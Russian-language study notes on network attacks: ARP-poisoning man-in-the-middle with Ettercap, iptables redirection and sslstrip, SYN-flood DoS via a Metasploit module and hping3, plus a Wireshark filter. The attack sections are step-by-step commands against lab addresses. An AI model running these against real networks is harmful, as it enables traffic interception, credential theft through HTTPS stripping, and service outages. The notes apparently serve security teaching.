# Сетевые атаки и анализ трафика

## Атаки "Man-in-the-Middle" ("Человек-посередине")

Атака при которой злоумышленик вмешивается в обем данными между двумя сторонами, выдаёт себя за обе стороны и получает доступ к информации, которые эти стороны отправляют друг-другу.

Протокол APR — применяется для нахождения MAC-адреса для заданого IP-адреса. Если передающий хост знает IP адрес, но не знает MAC, то он отправляет ARP-запрос, в ответ получает пакет содержащий нужный MAC-адрес. Полученый адресс сохраняется в ARP-таблицу.

### ARP Poisoning

Проблема в том, что в протоколе отсутвует проверка на подлиность ARP-пакетов, что деёт возможность атаки.

1. Хост 192.168.0.1 отправляет ARP-запрос, пытаясь определить MAC-адрес хоста 192.168.0.2
2. Коммутатор локальной сети (LAN) отправляет ARP-запрос всем хостам к сети
3. Злоумышленик (192.168.0.3, MAC 0000.0000.3333) отправляет сфальсифицированные ответы протокала ARP, так что хосты локальной сети связывают MAC-адрес злоумышленника с IP-адресом легитимного действующего компьютера или сервера.

### Пример

Делает в kali linux, команды выполнять с sudo/под рутом
1. Включаение маршрутизации IP-пакетов
```bash
sysctl net.ipv4.ip_forward=1
```
2. Включаение перенаправления
```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```
Команда перенаправляет весь входящий http-трафик на порпт 8080.
3. Проверить правила можно командой:
```bash
iptables -L -t nat
```
4. Для выполнение атаки нужно воспользоваться утилитой Ettercap
5. Нужно включить опцию снифинга: _Sniff — Unifled sniffing..._
6. Нужно найти хосты для атак, для этого нужно просканировать хосты: _Hosts — Scan for hosts_
7. Просмотр хосов в _Hosts — Host List_
8. Хосты жертвы нужно добавить в Target 1, маршрутизатор нужно добавить в Target 2. Добавлять в _Targets — Current targets_
9. Разметить цели в _Mitm — ARP poisoning_, обязательно должен быть включен параметр "Sniff remote connections."
10. Подмена HTTPS на HTTP:
```bash
sslstrip  -l 8080 -w sslstrip.log -a
```
-w — веедение логов, -a — записывать всё в логи
11. Для анализа перехваченных данных используется Wireshark.

## Атака "Denial-of-service" (отказ в обслуживании)

Атака с целью перевести к отказу в работе атакуемой системы. Достигается путем заполнения целевого ресурса избыточными запросами в попытке перегрузить системы и предотвратить заполнение некоторых или всех легитимных запросов.

### DDos

Distributed Denial-of-Service — атака типа "распределённый отказ в обслуживании".
* Для формирования потока запросов используется не один хост, а множество
* Атакующие хосты для атаки на цель объеденяются в **ботнеты**
* Ботнеты — это сети компьютеров, которые были взломаны хакерами и управляются удалённо.

### Пример

#### SYN-атака со спуфингом адресов иссточника

1. Анализ хоста жертвы, поиск открытых портов:
```bash
nmap -sS 192.168.0.0/24
```
2. Запустить metaspolit freamwork
```bash
msfconsole
```
3. Выбрать нужный модуль для атаки:
```bash
use auxiliary/dos/tcp/synflood
```
4. Указать данные для атаки, целеой хост и порт (можно указать любой открытый).
```
set RHOST 192.168.0.3
set RPORT 445
set TIMEOUT 5
```
5. Запуск атаки:
```bash
exploit
```

#### Hping3

1. Запуск атаки:
```bash
hping3 192.168.0.5 --flood
```

### Дополнительно

[Статья "основы фрагментации"](https://www.delphiplus.org/obnaruzhenie-narushenii-bezopasnosti-v-setyakh/osnovy-fragmentatsii.html)

## Анализ трафика с Wireshark

Поиск пакета с которого начиналась TCP-сессия: `tcp.flags.syn == 1`

### Дополнительно

[Установление TCP-соединения](https://ddos-guard.net/ru/terminology/protocols/3-h-etapnoe-rukopozhatie-tcp)
[Блокирование ip-адресов с помощью брандмауэра Windows](https://zen.yandex.ru/media/pronetblog/kak-zablokirovat-sait-cherez-brandmauer-windows-710-doloi-storonnee-po-5bf444b2740fd500aa0ab1cb)
